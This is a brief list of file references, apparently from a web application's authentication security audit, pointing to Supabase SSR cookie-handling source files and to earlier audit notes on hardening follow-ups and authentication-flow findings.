- `frontend/node_modules/@supabase/ssr/dist/main/utils/constants.js` (for `DEFAULT_COOKIE_OPTIONS`)
- `frontend/node_modules/@supabase/ssr/dist/main/cookies.js` (for browser `document.cookie` write path)
- `frontend/node_modules/@supabase/ssr/dist/main/createBrowserClient.js`
- `audits/HARDENING_FOLLOWUPS.md` (context)
- `audits/authentication-flow.md` F-1 / F-7 / F-8 (context — prior round)
